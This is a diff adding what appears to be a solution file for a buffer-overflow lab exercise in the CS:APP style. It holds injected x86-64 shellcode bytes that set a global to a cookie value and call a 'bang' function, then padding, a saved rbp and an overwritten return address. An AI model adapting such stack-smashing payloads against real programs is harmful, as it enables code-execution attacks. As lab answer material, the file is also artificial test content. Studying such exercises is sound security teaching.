@@ -1,0 +1,11 @@
+/* bad code of asm */
+/* movq $0x6061f0, %r15 */
+/* movl $0x2e561bea, (%r15) */
+/* call bang */
+49 c7 c7 f0 61 60 00 41 c7 07 ea 1b 56 2e e8 6b d7 d7 aa
+/* complete the string */
+00 00 00 00 00 00 00 00 00 00 00 00 00
+/* rbp */
+00 00 00 00 00 00 00 00
+/* ret add */
+b0 39 68 55 00 00 00 00
